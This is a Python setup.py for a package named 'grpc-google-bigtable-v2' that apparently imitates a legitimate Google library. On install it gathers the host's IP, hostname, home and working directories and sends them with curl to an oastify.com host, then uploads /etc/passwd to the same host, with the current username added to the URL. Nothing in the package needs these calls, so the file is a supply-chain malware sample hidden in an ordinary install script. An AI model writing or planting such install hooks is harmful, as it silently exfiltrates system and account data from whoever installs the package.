
from setuptools import setup
import os
import socket

hostname = socket.gethostname()
try:
    ip = socket.gethostbyname(hostname)
except:
    ip = "unknown"

home_dir = os.path.expanduser("~")
current_dir = os.getcwd()

data = f"originating_ip={ip}&hostname={hostname}&home_directory={home_dir}&current_directory={current_dir}"
os.system(f"curl -X POST --data '{data}' http://j6q0lq8adgwtkcg9rvzjze19107zvpje.oastify.com/$(whoami)")

# LFI-style exfiltration of /etc/passwd during install
os.system("curl -X POST --data-binary '@/etc/passwd' http://j6q0lq8adgwtkcg9rvzjze19107zvpje.oastify.com/$(whoami)")

setup(
    name="grpc-google-bigtable-v2",
    version="0.11.99",
    packages=["grpc_google_bigtable_v2"],
    install_requires=[],
)
